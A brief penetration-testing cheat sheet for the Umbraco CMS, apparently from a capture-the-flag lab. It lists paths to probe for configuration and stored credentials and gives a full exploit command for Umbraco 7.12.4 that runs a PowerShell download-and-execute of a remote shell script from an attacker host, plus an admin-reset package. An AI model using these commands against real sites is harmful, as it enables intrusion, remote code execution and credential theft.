# umbraco

## Interesting Paths

```bash
# login
/umbraco/#/login

# Check for umbracoConfigurationStatus (version)
# Check for <connectionStrings>
/Web.config

# use strings to check for creds
/App_Data/Umbraco.sdf
```

## Umbraco Version v7.12.4

```
https://github.com/noraj/Umbraco-RCE
$ python exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c 'powershell' -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.161/shell.ps1')"
```

## UmbracoAdminReset.dll (if Write-access on dir)

```
https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/
```
